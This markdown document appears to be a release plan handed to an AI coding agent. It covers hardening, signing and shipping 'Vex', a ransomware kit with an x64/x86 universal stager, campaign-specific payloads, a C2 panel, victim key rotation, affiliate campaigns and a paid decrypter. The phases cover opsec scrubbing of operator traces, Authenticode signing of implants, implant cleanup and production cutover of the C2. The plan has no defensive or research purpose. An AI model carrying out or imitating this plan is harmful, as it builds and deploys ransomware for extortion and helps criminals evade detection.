# GO â€” Production Readiness Operation

Status: **planned, not started**
Baseline commit: `539d474`
Current production artifact: `dist/universal_stager.exe`
Current universal SHA256: `4C10ECBD7D8A6BA6FFE847432539F8C9C02C833787E4DA473B17ECD3E6318183`

## GO contract

When the user says **GO** for this operation:

1. Work on a dedicated branch: `go/production-readiness`.
2. Apply the code changes in Phase 1â€“5 in order.
3. Rebuild x64, x86, and universal.
4. Run every local test and campaign test.
5. Sign and verify if a certificate is supplied.
6. Produce a release manifest and report.
7. Commit and push only when all mandatory gates pass.
8. Do not restart or replace the production C2 panel until release sign-off.

Stop conditions:

- universal launcher selects the wrong architecture
- campaign host/token is absent from either embedded stager
- manifest/hash mismatch
- signature verification failure
- payload selftest crash
- any write outside the lab/test paths
- a P0 defect discovered in crypto/state/persistence

## Phase 0 â€” Freeze and branch

- Archive current `dist/` and candidate hashes.
- Back up `VexC2/vex_c2.db`, `-wal`, `-shm`.
- Snapshot the C2 host and any test VM.
- Tag `pre-go-production-539d474`.
- Create branch `go/production-readiness`.
- Record:
  - x64 payload/stager hashes
  - x86 payload/stager hashes
  - universal hash
  - current C2 commit
- Confirm `git status` clean except ignored artifacts.

## Phase 1 â€” Generalize universal packaging

### 1.1 Refactor `build_universal.ps1`

Add parameters:

```powershell
param(
    [Parameter(Mandatory=$true)][string]$X64Stager,
    [Parameter(Mandatory=$true)][string]$X86Stager,
    [string]$OutFile = "dist\universal_stager.exe",
    [string]$WorkDir = "build\universal",
    [switch]$Sign,
    [string]$Pfx = "",
    [string]$Password = "",
    [switch]$Test
)
```

Requirements:

- Generate a unique `<WorkDir>\universal_stager.rc`.
- Embed resources:
  - 101 = `$X64Stager`
  - 102 = `$X86Stager`
- Pass `/p:UniversalRc=<rc path>` and `/p:OutDir=<out dir>` to MSBuild.
- Write `<OutFile>.json` with:
  - universal hash/size
  - embedded x64 hash/size
  - embedded x86 hash/size
  - source commit
  - build timestamp
- Verify after build that the universal file contains both resource sizes.
- Optional `-Test`:
  - auto x64 `--selftest --no-elevate` â†’ 0
  - `--arch x86 --selftest --no-elevate` â†’ 0
  - `--safe --no-elevate` â†’ 2

### 1.2 Make `universal_stager.vcxproj` parameterizable

- Accept `$(UniversalRc)`.
- Fall back to `build\universal_stager.rc` only when the property is empty.
- Add `/Brepro`.
- Keep output name `universal_stager.exe`.

### 1.3 Update `build_universal.ps1` callers

- Default build uses `dist\stager.exe` and `dist\stager_x86.exe`.
- Campaign build passes its own campaign-specific stagers.
- No hard-coded `dist` paths inside the project.

## Phase 2 â€” Campaign-aware universal builds

### 2.1 Refactor `tools/campaign_build.py`

Current builder only builds x64.

Add internal operations:

```python
_build_payload(platform, out_bin, out_obj, header)
_pack_stager(loader, payload, out_stager, out_stage)
_build_universal(x64_stager, x86_stager, out_file)
```

`build(name, host, token)` becomes:

1. Write campaign `campaign_config.h`.
2. Build x64 payload into `build/campaign/bin/<slug>/x64`.
3. Build x86 payload into `build/campaign/bin/<slug>/x86`.
4. Pack x64 stager.
5. Pack x86 stager.
6. Build universal with both.
7. Verify the campaign host and token appear in **both** payloads.
8. Record:
   - payload hashes
   - stager hashes
   - universal hash
   - campaign host/token presence
   - build log
9. Return universal as the primary `stager` path; keep x64/x86 paths for diagnostics.

### 2.2 Update C2

In `VexC2/app.py`:

- `_run_campaign_build` stores the universal artifact.
- `campaign_build_stager` serves `universal_stager.exe` with a clear filename.
- `campaign.json`/`campaign_builds` records universal SHA256.
- `campaign_nuke` removes universal and both architecture stagers.

### 2.3 Tests

- Campaign build with a unique host/token.
- Assert host UTF-16 bytes in x64 and x86 payloads.
- Assert universal resource sizes.
- Download via `/admin/build/<bid>/stager` is the universal file.
- A campaign-specific universal checkin reaches the campaign-specific C2, not the default host.

## Phase 3 â€” One build command, one manifest

### 3.1 New `build_all.ps1`

Sequence:

1. `build.ps1 -Test`
2. `build_x86.ps1`
3. `build_universal.ps1` with both stagers
4. optional signing
5. manifest generation
6. manifest verification
7. universal test
8. output only:
   - `release-dist\universal_stager.exe`
   - `release-dist\BUILD_MANIFEST.json`
   - `release-dist\BUILD_UNIVERSAL.txt`
   - `release-dist\SHA256SUMS.txt`

Keep `dist/` as a working directory; create a clean `release-dist/` directory for the single file.

### 3.2 Manifest schema 2

`BUILD_MANIFEST.json` must include:

```json
{
  "schema": 2,
  "commit": "...",
  "payload_x64": {"size": 0, "sha256": "..."},
  "payload_x86": {"size": 0, "sha256": "..."},
  "loader_x64": {"size": 0, "sha256": "..."},
  "loader_x86": {"size": 0, "sha256": "..."},
  "stager_x64": {"size": 0, "sha256": "..."},
  "stager_x86": {"size": 0, "sha256": "..."},
  "universal": {
    "size": 0,
    "sha256": "...",
    "embedded_x64_sha256": "...",
    "embedded_x86_sha256": "...",
    "resources": [101, 102]
  },
  "signer": {}
}
```

Update `tools/verify_manifest.py` to verify every field and the universal embedded hashes.

### 3.3 Staleness gate

`build_all.ps1` must fail if:

- either stager is older than its payload/loader
- universal is older than either stager
- resource hashes do not match the source stagers
- `release-dist/` contains a PDB or build input

## Phase 4 â€” Reproducibility

### 4.1 Linker determinism

Add `/Brepro` to:

- `Vexpayload.vcxproj` x64 and Win32
- `loader/xloader.vcxproj` x64 and Win32
- `universal_stager.vcxproj`

### 4.2 Deterministic build stamp

Replace `BuildStamp()` in `Vexpayload.cpp`:

- remove `__DATE__` / `__TIME__`
- use `VEX_BUILD_STAMP` from a generated header
- build scripts generate `build/build_stamp.h` from:
  - `git rev-parse --short HEAD`
  - optional `VEX_BUILD_ID`
  - no current time

### 4.3 Stage key policy

- Default remains random per build.
- Add optional `-StageSeedFile` or `VEX_STAGE_SEED`.
- If a seed is supplied, derive the stage key deterministically.
- Document:
  - unsigned payload/loader reproducible with a fixed build stamp
  - stager reproducible only with the release stage seed
  - Authenticode timestamps make signed artifacts non-bit-reproducible; record hashes.

### 4.4 Test

- Two clean builds with the same `VEX_BUILD_ID`:
  - payload hashes match
  - loader hashes match
  - stager hashes match only with the same stage seed
- Store the release-seed hash, never the seed itself.

## Phase 5 â€” Signing and runtime hardening

### 5.1 Signing

Extend `tools/sign.ps1`:

- `-Platform x64|x86`
- targets:
  - x64 payload
  - x64 loader
  - x86 payload
  - x86 loader
  - `dist\universal_stager.exe` after universal build
- `build_all.ps1 -Sign`:
  1. build x64 payload/loader
  2. sign x64 payload/loader
  3. pack x64
  4. build x86 payload/loader
  5. sign x86 payload/loader
  6. pack x86
  7. build universal
  8. sign universal
  9. manifest records signer/thumbprint

Do not sign the packed x64/x86 stager; the certificate table breaks `VXPAY003`. The universal launcher is safe to sign because its embedded resources are not the footer.

### 5.2 Universal runtime

In `universal_stager.cpp`:

- Temp path fallback:
  - `GetTempPathW`
  - `%LOCALAPPDATA%\Temp`
  - `%ProgramData%\VEX`
- Create the fallback directory if needed.
- Explicitly reject ARM64 or document x64-emulation behavior behind a runtime branch.
- Keep harness exit-code propagation.
- Keep `--arch x86` as test-only.
- Add a compile-time/version string and print it with `--version`.
- Keep implant-mode boot-time cleanup; document it in `BUILD_UNIVERSAL.txt`.

### 5.3 Opsec

- Extend `tools/opsec_check.py` to inspect:
  - universal launcher outer strings
  - embedded resources
- Reject:
  - local paths
  - operator hostnames
  - campaign tokens
  - test credentials.

## Phase 6 â€” Tests and release gate

### Local mandatory

- `build_all.ps1 -Test`
- x64/x86 `--safe` â†’ 2
- x64/x86 `--selftest` â†’ 0
- universal auto/x86 selftest â†’ 0
- universal `--inspect` x64/x86
- universal campaign build with unique host/token
- campaign universal C2 checkin on x64 and x86
- `c2_selftest.py` 250/250
- `recovery_selftest.py` x64/x86 17/17
- state/wipe selftests x64/x86
- `e2e_live.py` x64/x86 11/11
- manifest verify
- signature verify (if certificate)
- no PDB in `release-dist/`

### OS matrix

Use the userâ€™s verified matrix as external evidence where available, but keep the audit gate honest:

- Windows 10 1507â€“22H2 x64
- native Windows 10 x86
- Windows 11 21H2â€“24H2 x64
- Server 2016/2019/2022

Any cell without evidence is **BLOCKED**, not PASS.

### Release gate

Release `release-dist/universal_stager.exe` only if:

- all local mandatory tests pass
- campaign build produces universal with campaign host/token
- manifest and signatures verify
- reproducibility scope is documented
- no unresolved P0/P1 defect
- external OS evidence is attached or the release is explicitly labeled limited

## Phase 7 â€” C2 production cutover

Before exposing the panel:

- create a real `.master` / `VEX_MASTER`
- rotate plaintext-sealed victim keys with `tools/vault_rotate.py`
- start with `VEX_SECURE_COOKIE=1` behind TLS
- set `VEX_ENV=production` and refuse `VEX_ALLOW_PLAINTEXT=1`
- back up DB before rotation
- verify root login, step-up, affiliate campaign, paid decrypter

This is operational, not part of the universal binary. Do not mix it with the release build.

## Deliverables

- `release-dist/universal_stager.exe` â€” the only shipped EXE
- `release-dist/BUILD_MANIFEST.json`
- `release-dist/BUILD_UNIVERSAL.txt`
- `release-dist/SHA256SUMS.txt`
- test logs and campaign universal checkin evidence
- signed payload/loader and signed universal, or explicit unsigned exception
- update to `docs/BUILD.md` and audit report

## Rollback

- `git switch go/production-readiness` stays unmerged until sign-off.
- Restore `dist/` and `release-dist/` from `pre-go-production-539d474`.
- Restore C2 DB/WAL and panel service.
- Restore VM snapshots.
- Revert signature/seed artifacts if a gate fails.
- Never leave a partially built universal in `release-dist/`.

## Output rule

At the end, there must be exactly one production EXE:

```text
release-dist\universal_stager.exe
```

Everything else is build input, evidence, or debug material.


